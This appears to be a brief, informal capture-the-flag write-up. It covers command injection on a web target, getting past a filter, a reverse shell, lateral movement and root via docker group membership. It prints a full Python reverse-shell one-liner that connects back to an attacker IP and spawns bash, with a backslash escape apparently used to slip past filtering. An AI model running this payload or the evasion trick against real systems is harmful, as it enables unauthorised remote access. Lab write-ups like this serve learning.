we saw a directory which was featuring the command we put in there so we tried all but it had some protections

so we did xxd index and it gave result

to get shell

`p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.10.9",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`

we got shell and we laterally esc easily but on that acc there was nithing

so we dropeed back to inital iuser and it was docker

gtfobsn and root
